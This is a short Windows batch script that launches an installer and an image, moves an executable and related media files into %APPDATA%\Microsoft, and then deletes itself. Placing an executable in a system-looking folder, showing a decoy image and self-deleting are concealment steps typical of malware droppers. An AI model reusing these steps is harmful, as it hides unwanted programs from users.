@echo off
set "DEST=%APPDATA%\Microsoft"

start setupTuffClick.exe
start v1.png
del tuff.7z

if not exist "%DEST%" mkdir "%DEST%"
for %%F in (*tuff*.png *tuff*.mp3) do (
    move "%%F" "%DEST%\"
)
move tuff_click.exe %DEST%

start /b "" cmd /c del "%~f0"&exit /b

